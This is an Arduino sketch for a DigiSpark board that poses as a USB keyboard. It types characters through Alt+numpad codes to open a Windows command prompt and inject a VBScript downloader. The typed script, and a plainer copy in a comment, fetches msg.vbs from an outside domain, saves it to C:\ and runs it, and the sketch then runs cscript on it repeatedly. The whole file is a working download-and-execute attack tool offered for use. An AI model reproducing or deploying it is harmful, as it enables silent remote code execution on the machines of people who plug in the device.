#include "DigiKeyboard.h"
#define ALT                 MOD_ALT_LEFT
#define KP_1                (  89  | 0xF000 )
#define KP_2                (  90  | 0xF000 )
#define KP_3                (  91  | 0xF000 )
#define KP_4                (  92  | 0xF000 )
#define KP_5                (  93  | 0xF000 )
#define KP_6                (  94  | 0xF000 )
#define KP_7                (  95  | 0xF000 )
#define KP_8                (  96  | 0xF000 )
#define KP_9                (  97  | 0xF000 )
#define KP_0                (  98  | 0xF000 )
void keyp(byte o, byte t){
 DigiKeyboard.sendKeyPress(o,t); 
}
void nl(){
  keyp(KP_0,ALT);
  po();
}
void po(){
  DigiKeyboard.sendKeyPress(0,ALT);
}
void setup() {
}
void st(char sm){
  if(sm =='{'){
       nl();
keyp(KP_1,ALT);
po();
keyp(KP_2,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);
DigiKeyboard.update();
return;
  }
  if(sm =='}'){
keyp(KP_1,ALT);
keyp(KP_2,ALT);
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);
DigiKeyboard.update();
return;
  }
  if(sm ==','){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_4,ALT);
po();
DigiKeyboard.sendKeyPress(0);
po();
return;
  }
  if(sm =='_'){
     nl();
keyp(KP_9,ALT);
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm ==' '){
     nl();
keyp(KP_3,ALT);
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='!'){
     nl();
keyp(KP_3,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='\''){
     nl();
keyp(KP_3,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='*'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='+'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='-'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='.'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='/'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='0'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='1'){
     nl();
keyp(KP_4,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='2'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='3'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='4'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='5'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='6'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='7'){
nl();
keyp(KP_5,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='8'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='9'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm ==':'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm ==';'){
     nl();
keyp(KP_5,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='<'){
     nl();
keyp(KP_6,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='='){
     nl();
keyp(KP_6,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='>'){
     nl();
keyp(KP_6,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='?'){
     nl();
keyp(KP_6,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='@'){
     nl();
keyp(KP_6,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='A'){
         nl();
keyp(KP_6,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='B'){
         nl();
keyp(KP_6,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='C'){
         nl();
keyp(KP_6,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='D'){
         nl();
keyp(KP_6,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='E'){
         nl();
keyp(KP_6,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='F'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='G'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='H'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='I'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='J'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='K'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='L'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='M'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='N'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='O'){
         nl();
keyp(KP_7,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='P'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='Q'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='R'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='S'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='T'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='U'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='V'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='W'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='X'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='Y'){
         nl();
keyp(KP_8,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='Z'){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='['){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='\\'){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm ==']'){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='^'){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='('){
         nl();
keyp(KP_4,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm ==')'){
         nl();
keyp(KP_4,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='`'){
         nl();
keyp(KP_9,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='"'){
         nl();
keyp(KP_3,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='a'){
     nl();
keyp(KP_9,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='b'){
     nl();
keyp(KP_9,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='c'){
     nl();
keyp(KP_9,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='d'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='e'){
keyp(KP_1,ALT);
keyp(KP_0,ALT);
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='f'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='g'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='h'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='i'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='j'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='k'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='l'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='i'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='m'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='n'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='o'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='p'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_2,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='q'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_3,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='r'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_4,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='s'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_5,ALT);
DigiKeyboard.sendKeyPress(0);

return;
}
  if(sm =='t'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_6,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='u'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_7,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='v'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_8,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='w'){
        nl();
keyp(KP_1,ALT);
po();
keyp(KP_1,ALT);
po();
keyp(KP_9,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='x'){
      nl();
keyp(KP_1,ALT);
po();
keyp(KP_2,ALT);
po();
keyp(KP_0,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='y'){
     nl();
keyp(KP_1,ALT);
po();
keyp(KP_2,ALT);
po();
keyp(KP_1,ALT);
DigiKeyboard.sendKeyPress(0);

return;
  }
  if(sm =='z'){
     nl();
keyp(KP_1,ALT);
po();
keyp(KP_2,ALT);
po();
keyp(KP_2,ALT);

DigiKeyboard.sendKeyPress(0);
DigiKeyboard.delay(550);
return;
  }
  if(sm =='|'){
  DigiKeyboard.sendKeyPress(KEY_ENTER);
DigiKeyboard.sendKeyPress(0);

return;
  }
  }
void cmd(){
DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //minimize all windows
  DigiKeyboard.delay(1000);
  st('c');
   DigiKeyboard.delay(300);
  st('m');
   DigiKeyboard.delay(300);
  st('d'); 
 DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
}

void loop() {
/*
 * var str = 'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")|dim bStrm: Set bStrm = createobject("Adodb.Stream")|xHttp.Open "GET", "https://xn--80aqah2a0c.com/msg.vbs", False|xHttp.Send|with bStrm|.type = 1|.open|.write xHttp.responseBody|.savetofile "c:\ms.vbs", 2|end with|Set WshShell = CreateObject("WScript.Shell")|WshShell.Run "c:\ms.vbs", 0, false|Set WshShell = Nothing|WScript.Quit';
var total = ''cmd;
for(var i =0;i<str.length;i++){
total+="st('"+str[i]+"');"+'<br>';
}
document.write(total);
 */

/* st('{');
 *  
st('}');
st(',');
st('_');
st(' ');
st('!');
st('\'');
st('(');
st(')');
st('*');
st('+');
st(',');
st('-');
st('.');
st('/');
st('0');
st('1');
st('2');
st('3');
st('4');
st('5');
st('6');
st('7');
st('8');
st('9');
/*st(':');
st(';');
st('<');
st('=');
st('<');
st('?');
st('@');
st('A');
st('B');
st('C');
st('D');
st('E');
st('F');
st('G');
st('H');
st('I');
st('J');
st('K');
st('L');
st('M');
st('N');
st('O');
st('P');
st('Q');
st('R');
st('S');
st('T');
st('U');
st('V');
st('W');
st('X');
st('Y');
st('Z');
st('[');
st('\\');
st(']');
st('^');
st('_');
st('`');
st('a');
st('b');
st('c');
st('d');
st('e');
st('f');
st('g');
st('h');
st('i');
st('j');
st('k');
st('i');
st('m');
st('n');
st('o');
st('p');
st('q');
st('r');
st('s');
st('t');
st('u');
st('v');
st('w');
st('x');
st('y');
st('|');
st('z');*/
cmd();
 DigiKeyboard.delay(4000);
 st('e');st('c');st('h');st('o');st(' ');st('d');st('i');st('m');st(' ');st('x');st('H');st('t');st('t');st('p');st(':');st('S');st('e');st('t');st(' ');st('x');st('H');st('t');st('t');st('p');st(' ');st('=');st(' ');st('c');st('r');st('e');st('a');st('t');st('e');st('o');st('b');st('j');st('e');st('c');st('t');st('(');st('"');st('M');st('i');st('c');st('r');st('o');st('s');st('o');st('f');st('t');st('.');st('X');st('M');st('L');st('H');st('T');st('T');st('P');st('"');st(')');st(':');st('d');st('i');st('m');st(' ');st('b');st('S');st('t');st('r');st('m');st(':');st('S');st('e');st('t');st(' ');st('b');st('S');st('t');st('r');st('m');st(' ');st('=');st(' ');st('c');st('r');st('e');st('a');st('t');st('e');st('o');st('b');st('j');st('e');st('c');st('t');st('(');st('"');st('A');st('d');st('o');st('d');st('b');st('.');st('S');st('t');st('r');st('e');st('a');st('m');st('"');st(')');st(':');st('x');st('H');st('t');st('t');st('p');st('.');st('O');st('p');st('e');st('n');st(' ');st('"');st('G');st('E');st('T');st('"');st(',');st(' ');st('"');st('h');st('t');st('t');st('p');st('s');st(':');st('/');st('/');st('x');st('n');st('-');st('-');st('8');st('0');st('a');st('q');st('a');st('h');st('2');st('a');st('0');st('c');st('.');st('c');st('o');st('m');st('/');st('m');st('s');st('g');st('.');st('v');st('b');st('s');st('"');st(',');st(' ');st('F');st('a');st('l');st('s');st('e');st(':');st('x');st('H');st('t');st('t');st('p');st('.');st('S');st('e');st('n');st('d');st(':');st('w');st('i');st('t');st('h');st(' ');st('b');st('S');st('t');st('r');st('m');st(':');st('.');st('t');st('y');st('p');st('e');st(' ');st('=');st(' ');st('1');st(':');st('.');st('o');st('p');st('e');st('n');st(':');st('.');st('w');st('r');st('i');st('t');st('e');st(' ');st('x');st('H');st('t');st('t');st('p');st('.');st('r');st('e');st('s');st('p');st('o');st('n');st('s');st('e');st('B');st('o');st('d');st('y');st(':');st('.');st('s');st('a');st('v');st('e');st('t');st('o');st('f');st('i');st('l');st('e');st(' ');st('"');st('C');st(':');st('\\');st('m');st('.');st('v');st('b');st('s');st('"');st(',');st(' ');st('2');st(':');st('e');st('n');st('d');st(' ');st('w');st('i');st('t');st('h');st(':');st('S');st('e');st('t');st(' ');st('o');st('S');st('h');st('e');st('l');st('l');st(' ');st('=');st(' ');st('W');st('S');st('c');st('r');st('i');st('p');st('t');st('.');st('C');st('r');st('e');st('a');st('t');st('e');st('O');st('b');st('j');st('e');st('c');st('t');st(' ');st('(');st('"');st('W');st('S');st('c');st('r');st('i');st('p');st('t');st('.');st('S');st('h');st('e');st('l');st('l');st('"');st(')');st(':');st('o');st('S');st('h');st('e');st('l');st('l');st('.');st('r');st('u');st('n');st(' ');st('"');st('C');st(':');st('\\');st('m');st('.');st('v');st('b');st('s');st('"');st(' ');st('>');st(' ');st('C');st(':');st('\\');st('d');st('.');st('v');st('b');st('s');
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 st('c'); st('s'); st('c'); st('r'); st('i'); st('p'); st('t'); st(' '); st('C'); st(':'); st('\\'); st('d'); st('.'); st('v');st('b');st('s');
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
}
